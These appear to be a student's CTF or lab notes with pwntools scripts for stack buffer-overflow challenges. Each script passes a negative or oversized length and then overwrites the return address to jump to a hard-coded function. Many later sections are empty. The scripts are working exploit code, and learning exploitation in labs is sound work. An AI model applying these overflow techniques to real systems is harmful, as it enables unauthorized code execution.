## 4
### .0
```py
from pwn import *
context(os='linux',arch='amd64')
elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
io=process(elfpath)

io.sendline('-1')

pl=b'b'*120+p64(0x40229d)

io.send(pl)
print(io.recvall().decode())

```
### .1
准确的buf相对rbp的偏移要看汇编
```s
lea     rax, [rbp+var_30]
mov     [rbp+buf], rax
# ...
mov     rax, [rbp+buf]
mov     rsi, rax
```
```py

from pwn import *
context(os='linux',arch='amd64')
elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
io=process(elfpath)
io.sendline('-1')

pl=b'b'*(0x30+8)+p64(0x4020d3)

io.send(pl)
print(io.recvall().decode())

```
## 5
### .0
```py

from pwn import *
context(os='linux',arch='amd64')
elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
io=process(elfpath)

io.sendline('65536')
io.sendline('65536')

pl=b'b'*(152)+p64(0x401c4b)

io.send(pl)
print(io.recvall().decode())

```
### .1
```py

from pwn import *
context(os='linux',arch='amd64')
elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
io=process(elfpath)

io.sendline('65536')
io.sendline('65536')

pl=b'b'*(0x80+8)+p64(0x4020D4)

io.send(pl)
print(io.recvall().decode())

```
## 9
???怎么直接9了
### .0
```py

```
### .1
```py

```
## 10
### .0
```py

```
### .1
```py

```
## 11
### .0
```py

```
### .1
```py

```
## 12
### .0
```py

```
### .1
```py

```
## 13
### .0
```py

```
### .1
```py

```
## 14
### .0
```py

```
### .1
```py

```
## 15
### .0
```py

```
### .1
```py

```
